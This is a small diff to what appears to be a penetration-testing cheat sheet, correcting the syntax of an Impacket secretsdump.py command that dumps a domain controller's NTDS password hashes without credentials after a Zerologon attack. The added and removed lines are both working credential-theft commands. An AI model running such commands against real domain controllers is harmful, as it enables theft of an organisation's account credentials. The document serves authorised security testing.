@@ -94,5 +94,5 @@ secretsdump.py -debug -outputfile <dc_fqdn> -ntds <NTDS_FILE|ntds_file.dit> -sys
 ## NTDS - zerologon 
 zerologon
 ```bash
-secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -no-pass <dc_name>\$/@<dc_fqdn>
+secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -no-pass <dc_name>\$@<dc_fqdn>
 ```
